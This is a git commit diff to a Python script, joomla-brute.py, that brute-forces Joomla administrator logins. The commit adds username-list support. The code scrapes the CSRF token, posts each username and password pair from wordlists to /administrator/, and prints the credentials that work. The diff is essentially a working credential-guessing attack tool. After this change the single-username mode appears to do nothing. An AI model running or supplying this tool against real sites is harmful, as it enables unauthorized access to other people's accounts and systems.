10debdb1e5ef1ad3bd0d39ce2bc1ff979e465d78
ajnik <ajnik@outlook.com>
2020-01-06 23:48:34 +0100

    Added userlist functionality. Renamed methods to better describe the action.

--- joomla-brute.py
+++ joomla-brute.py
@@ -16,35 +16,41 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 class Joomla():
- 
-    def __init__(self):
-        self.startbruteforce()
 
-    def startbruteforce(self):
+    def __init__(self):
+        self.initializeVariables()
+        self.sendrequest()
+    
+    def initializeVariables(self):
         #Initialize args
         parser = argparse.ArgumentParser(description='Joomla login bruteforce')
         #required
         parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
         parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')
-        parser.add_argument('-usr', '--username', required=True, type=str, help='One single username')
+
         #optional
         parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
         parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
-        
+        #these two arguments should not be together
+        group = parser.add_mutually_exclusive_group(required=True)
+        group.add_argument('-usr', '--username', type=str, help='One single username')
+        group.add_argument('-U', '--userlist', type=str, help='Username list')
+
         args = parser.parse_args()
+
         #parse args and save proxy
         if args.proxy:
             parsedproxyurl = urlparse(args.proxy)
             self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
         else:
             self.proxy=None
-        
+
         #determine if verbose or not
         if args.verbose:
             self.verbose=True
         else:
             self.verbose=False
-        
+
         #http:/site/administrator
         self.url = args.url+'/administrator/'
         self.ret = 'aW5kZXgucGhw'
@@ -53,37 +59,49 @@ class Joomla():
         #Need cookie
         self.cookies = requests.session().get(self.url).cookies.get_dict()
         #Wordlist from args
-        self.wordlist = args.wordlist
+        self.wordlistfile = args.wordlist
         self.username = args.username
+        self.userlist = args.userlist
 
-        with open(self.wordlist, 'rb+') as f:
-            passwords = ([line.rstrip() for line in f])
-            f.close()
+    def sendrequest(self):
+        if self.userlist:
+            for user in self.getdata(self.userlist):
+                user=user.decode('utf-8')
+                
+                for password in self.getdata(self.wordlistfile):
+                    #first GET for CSSRF token
+                    r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies)
+                    soup = BeautifulSoup(r.text, 'html.parser')
+                    longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
+                    password=password.decode('utf-8')
+                    data = {
+                        'username' : user,
+                        'passwd' : password,
+                        'option' : self.option,
+                        'task' : self.task,
+                        'return' : self.ret,
+                        longstring : 1
+                    }
+                    r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies)
+                    soup = BeautifulSoup(r.text, 'html.parser')
+                    response = soup.find('div', {'class': 'alert-message'})
+
+                    if response:
+                        if self.verbose:
+                            print(f'{bcolors.FAIL} {user}:{password}{bcolors.ENDC}')
+                    else:
+                        print(f'{bcolors.OKGREEN} {user}:{password}{bcolors.ENDC}')
+                        break
+        else:
+            None
             
-        for password in passwords:
-            #first get for cssrf token
-            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies)
-            soup = BeautifulSoup(r.text, 'html.parser')
-            self.longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
+    @staticmethod
+    def getdata(path):
+        
+        with open(path, 'rb+') as f:
+            data = ([line.rstrip() for line in f])
+            f.close()
+        return data
 
-            password=password.decode('utf-8')
-            data = {
-                'username' : self.username,
-                'passwd' : password,
-                'option' : self.option,
-                'task' : self.task,
-                'return' : self.ret,
-                self.longstring : 1
-            }
-            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies)
-            soup = BeautifulSoup(r.text, 'html.parser')
-            response = soup.find('div', {'class': 'alert-message'})
- 
-            if response:
-                if self.verbose:
-                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
-            else:
-                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
-                break
 
 joomla = Joomla()
